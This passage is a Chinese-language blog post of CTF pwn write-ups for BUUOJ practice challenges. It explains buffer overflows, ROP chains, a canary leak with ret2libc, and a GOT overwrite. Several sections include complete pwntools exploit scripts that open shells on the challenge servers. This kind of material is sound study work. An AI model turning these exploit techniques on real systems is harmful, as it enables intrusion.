<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="一picoctf_2018_rop chain​	这道题依旧是利用栈溢出和rop，不过我一开始一直被a1怎么被赋值和传参困惑。后来看了wp，突然醒悟，也更深刻地理解到什么是构造rop函数传参。这里的win_function2和flag也是函数，只不过他们是被程序员自行封装的函数，既然是函数那么我们就可以把他们当作puts和system等函数对待。   exp如下： #from pwn import">
<meta property="og:type" content="article">
<meta property="og:title" content="wen&#39;s blog">
<meta property="og:url" content="http://example.com/2024/03/04/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="wen&#39;s blog">
<meta property="og:description" content="一picoctf_2018_rop chain​	这道题依旧是利用栈溢出和rop，不过我一开始一直被a1怎么被赋值和传参困惑。后来看了wp，突然醒悟，也更深刻地理解到什么是构造rop函数传参。这里的win_function2和flag也是函数，只不过他们是被程序员自行封装的函数，既然是函数那么我们就可以把他们当作puts和system等函数对待。   exp如下： #from pwn import">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027259.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027406.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027810.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027357.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027774.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027973.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027537.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027347.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026606.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026880.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026003.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026014.png">
<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20240126132016633.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026450.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026620.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026215.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026857.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026923.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026536.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026191.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026773.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026255.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026949.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026443.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026635.png">
<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20240226125433840.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026829.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041026813.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025976.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025360.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025754.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025263.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025524.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025014.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025731.png">
<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20240226141140541.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025339.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025834.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025165.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025806.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025509.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025768.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041025042.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041024181.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041028088.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029461.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029861.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029869.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029021.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029635.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029656.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029633.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029302.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029446.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029905.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041029529.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030018.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030160.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030296.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030775.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030262.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030893.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030776.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030677.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030003.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030490.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030015.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030836.png">
<meta property="og:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041030467.png">
<meta property="article:published_time" content="2024-03-04T04:37:28.810Z">
<meta property="article:modified_time" content="2024-03-04T04:25:15.572Z">
<meta property="article:author" content="wen">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/Qwen11/pic/raw/master/202403041027259.png">

<link rel="canonical" href="http://example.com/2024/03/04/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title> | wen's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">wen's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/04/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="wen">
      <meta itemprop="description" content="Here's what you want.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wen's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-03-04 12:37:28 / Modified: 12:25:15" itemprop="dateCreated datePublished" datetime="2024-03-04T12:37:28+08:00">2024-03-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><p>​	这道题依旧是利用栈溢出和<code>rop</code>，不过我一开始一直被<code>a1</code>怎么被赋值和传参困惑。后来看了<code>wp</code>，突然醒悟，也更深刻地理解到什么是构造<code>rop</code>函数传参。这里的<code>win_function2</code>和<code>flag</code>也是函数，只不过他们是被程序员自行封装的函数，既然是函数那么我们就可以把他们当作<code>puts</code>和<code>system</code>等函数对待。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027259.png" alt="image-20240119135055169"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027406.png" alt="image-20240119135122422"></p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from pwn import *</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27370)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chain&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x0804862b</span></span><br><span class="line">win1_addr = <span class="number">0x080485cb</span></span><br><span class="line">win2_addr = <span class="number">0x080485d8</span></span><br><span class="line">win2_argu = <span class="number">0xBAAAAAAD</span></span><br><span class="line">flag_argu = <span class="number">0xDEADBAAD</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(win1_addr)</span><br><span class="line">payload += p32(win2_addr)+p32(flag_addr)+p32(win2_argu)+p32(flag_argu)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;input&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027810.png" alt="image-20240119140206052"></p>
<h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a><code>bjdctf_2020_router</code></h2><p>​	本题主要考察<code>Linux</code>中的逻辑运算符，<code>command1 &amp;&amp; command2</code>中<code>command1</code>成功执行才会执行<code>command2</code>，</p>
<p><code>command1 || command2</code>中<code>command1</code>执行失败才会执行<code>command2</code>，<code>command1 ; command2</code>两个命令都会执行。</p>
<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027357.png" alt="image-20240123144823750"></p>
<h2 id="mrctf2020-easyoverflow"><a href="#mrctf2020-easyoverflow" class="headerlink" title="mrctf2020_easyoverflow"></a><code>mrctf2020_easyoverflow</code></h2><p>​	这道题的难点在于代码审计。<code>main</code>函数里有<code>system(/bin/sh)</code>，但是 要跳过<code>if</code>语句才能执行。<code>if</code>语句中条件为假则跳过，即需要<code>!(unsigned int)check(v5)</code>为假，即<code>(unsigned int)check(v5)</code>为真，又因为<code>0</code>为假，非<code>0</code>为真，所以<code>check</code>函数的返回值需为非<code>0</code>。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027774.png" alt="image-20240125172806211"></p>
<p>​	再看<code>check</code>函数，如果地址<code>i + a1</code>处的一个字节的值等于<code>fake_flag[i]</code>，就跳出循环返回<code>0</code>，这里<code>a1 = v5</code>，而<code>fake_flag</code>中装的也是<code>n0t_r3@11y_f1@g</code>，因此我们需要让<code>v5 = n0t_r3@11y_f1@g</code>。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027973.png" alt="image-20240125175107407"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027537.png" alt="image-20240125173751965"></p>
<p>​	再看<code>gets</code>函数，我们输入的数据被写到了<code>v4</code>中，而<code>v4</code>距离栈底<code>70h</code>，<code>v5</code>距离栈底<code>40h</code>。也就是说我们覆盖<code>v4</code>后再输入的数据就被写到了<code>v5</code>。<code>ok</code>可以写<code>exp</code>了。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041027347.png" alt="image-20240125175257942"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026606.png" alt="image-20240125175230951"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28193</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">b&#x27;n0t_r3@11y_f1@g&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026880.png" alt="image-20240125175811517"></p>
<h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><p>​	程序中有<code>system</code>函数，通过简单计算也可知字符串<code>sh</code>的地址<code>0x08048670</code>。溢出字节为<code>0x8</code>，如果用<code>system</code>函数的<code>plt</code>地址就要再后面再加个执行完<code>system</code>函数后的返回地址，便不能传参了，所以直接找到<code>call _system</code>这条指令的地址，后面不用加返回地址。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026003.png" alt="image-20240126125536671"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026014.png" alt="image-20240126125504573"></p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28772</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./wu&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wu&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = <span class="number">0x08048670</span></span><br><span class="line">call_sys = <span class="number">0x08048529</span></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0x18+4)+p32(sys_addr)+p32(0)+p32(sh_addr)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(call_sys)+p32(sh_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20240126132016633.png" alt="image-20240126132016633"></p>
<h2 id="wustctf2020-closed-输出重定向"><a href="#wustctf2020-closed-输出重定向" class="headerlink" title="wustctf2020_closed(输出重定向)"></a><code>wustctf2020_closed(输出重定向)</code></h2><p>​	程序中有<code>system(&quot;/bin/sh&quot;)</code>直接拿到<code>shell</code>了，但是直接<code>cat flag</code>没有任何输出是因为<code>close(1)</code>关闭了标准输出，我们输入<code>exec 1&gt;&amp;0</code>可以重新打开标准输出，<code>cat flag</code>拿到<code>flag</code>。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026450.png" alt="image-20240126144729251"></p>
<h2 id="others-babystack-canary"><a href="#others-babystack-canary" class="headerlink" title="others_babystack(canary)"></a><code>others_babystack(canary)</code></h2><p>​	<code>puts</code>的截断字符是<code>\x00</code>，我们直接输入<code>136</code>个字符，将<code>s</code>与<code>canary</code>之间全部填充字符，而<code>\n</code>换行符会覆盖<code>canary</code>最低位的<code>\x00</code>这个字节，<code>puts</code>就能直接把<code>canary</code>的值输出了。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026620.png" alt="image-20240129184718236"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026215.png" alt="image-20240129182601014"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment">#因为canary最低位的\x00被\n覆盖了，\n就是换行符，所以打印出的canary只有7个字节</span></span><br></pre></td></tr></table></figure>

<p>​	接下来就是普通的<code>ret2libc</code>了，<code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27301</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./puts&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(hex(canary))</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x400a93</span>)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x400908</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)  <span class="comment">#</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="comment">#退出当前循环，也就是回到一开始的循环</span></span><br><span class="line">p.recv()</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(hex(puts_addr))</span></span><br><span class="line"></span><br><span class="line">base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys = base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x400a93</span>)+p64(binsh)+p64(sys)+p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026857.png" alt="image-20240129194931388"></p>
<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a><code>picoctf_2018_got_shell</code></h2><p>​	保护只开了<code>NX</code>，下面是程序中的主要代码，分析一下没有栈溢出，也没有其他明显的漏洞。程序的意思就是输入一个数据被写到<code>v3</code>的地址，再输入一个数据被写到<code>v4</code>的地址，然后执行<code>*v3 = v4</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> win()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> __cdecl __noreturn main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v3; // [esp+14h] [ebp-114h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+18h] [ebp-<span class="number">1</span>10h] BYREF</span><br><span class="line">  char s[<span class="number">256</span>]; // [esp+1Ch] [ebp-10Ch] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v6; // [esp+11Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  puts(<span class="string">&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v3);</span><br><span class="line">  sprintf(s, <span class="string">&quot;Okay, now what value would you like to write to 0x%x&quot;</span>, v3);</span><br><span class="line">  puts(s);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v4);</span><br><span class="line">  sprintf(s, <span class="string">&quot;Okay, writing 0x%x to 0x%x&quot;</span>, v4, v3);</span><br><span class="line">  puts(s);</span><br><span class="line">  *v3 = v4;</span><br><span class="line">  puts(<span class="string">&quot;Okay, exiting now...\n&quot;</span>);</span><br><span class="line">  exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	也就是说我们可以把<code>puts</code>的<code>got</code>表值写到<code>v3</code>，把后门函数的地址写到<code>v4</code>，然后<code>puts</code>的<code>got</code>表指向的地址会被改成后门函数的地址，然后下面执行流执行<code>puts(&quot;Okay, exiting now...\n&quot;)</code>调用<code>puts</code>函数的时候就会调用后门函数。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29093</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pico&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">win_addr = <span class="number">0x0804854B</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;</span>, <span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(win_addr))</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026923.png" alt="image-20240209135315842"></p>
<h2 id="mrctf2020-shellcode-revenge-可见字符shellcode"><a href="#mrctf2020-shellcode-revenge-可见字符shellcode" class="headerlink" title="mrctf2020_shellcode_revenge(可见字符shellcode)"></a><code>mrctf2020_shellcode_revenge(可见字符shellcode)</code></h2><p>​	本题没有开<code>NX</code>可以用<code>shellcode</code>，但是这道题跟我之前遇见的都不一样，第一次遇见可见字符的<code>shellcode</code>。</p>
<p>​	先拖入<code>ida</code>中，不能<code>f5</code>查看反汇编，那就只能分析汇编代码了。程序先打印出一串字符，然后就是<code>read</code>往<code>buf</code>中写入<code>0x400</code>个字节，<code>buf</code>在<code>.bss</code>段。</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026536.png" alt="image-20240225152459026"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026191.png" alt="image-20240225152133323"></p>
<p>​	既然要输入<code>shellcode</code>那么<code>read</code>返回值（放在<code>rax</code>中）肯定大于<code>0</code>，执行流便会跳转到<code>loc_11AC</code>这里执行下面内容</p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026773.png" alt="image-20240225153840042"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026255.png" alt="image-20240225154348292"></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041026949.png" alt="image-20240225154407905"></p>
